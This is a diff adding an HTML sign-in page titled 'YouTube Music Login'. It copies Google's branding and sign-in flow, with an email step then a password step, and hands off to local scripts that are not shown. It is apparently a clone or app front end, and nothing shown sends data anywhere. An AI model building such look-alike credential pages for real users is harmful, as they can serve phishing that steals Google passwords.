@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube Music Login</title>
+    <link rel="stylesheet" href="../styles/login1.css">
+</head>
+<body>
+    <div class="container">
+        <div class="left-panel">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
+            <div class="left-text">
+                <h3>Sign in</h3>
+                <p>to continue to YouTube Music</p>
+            </div>
+        </div>
+        <div class="right-panel">
+            <div class="sign-in-options">
+                <button id="google-sign-in" class="google-button sign-in-button">
+                    <img src="https://developers.google.com/identity/images/g-logo.png" alt="Google Logo" width="30">
+                    Sign in with Google
+                </button>
+                <button type="button" id="email-sign-in" class="email-button sign-in-button ">Sign in with email</button>
+            </div>
+            <form id="email-form" style="display: none;">
+                <div class="email">
+                    <div class="input-group">
+                        <input type="email" id="email" placeholder="Email" required>
+                        <a href="#" class="forgot-link">Forgot email?</a>
+                    </div>
+                </div>
+                <p class="guest-mode">Not your computer? Use Guest mode to sign in privately.</p>
+                <a href="#" class="learn-more">Learn more about using Guest mode</a>
+                <div class="buttons">
+                    <!-- <a href="#" class="create-account">Create account</a> -->
+                    <button type="button" class="next-button" id="nextStep">Next</button>
+                </div>
+                <div class="input-group password-group" style="display: none;">
+                    <p>Hi, <span id="username"></span></p>
+                    <input id="password"  type="password" placeholder="Enter your password" required>
+                    
+                    <a href="#" class="forgot-link">Forgot password?</a>
+                    <div class="buttons nextbutton"><button type="submit" class="next-button">Next</button></div>
+                    
+                </div>
+            </form>
+        </div>
+    </div>
+    <script   src="../js/login1.js"></script>
+    <script type="module" src="../js/auth.js"></script>
+</body>
+</html>
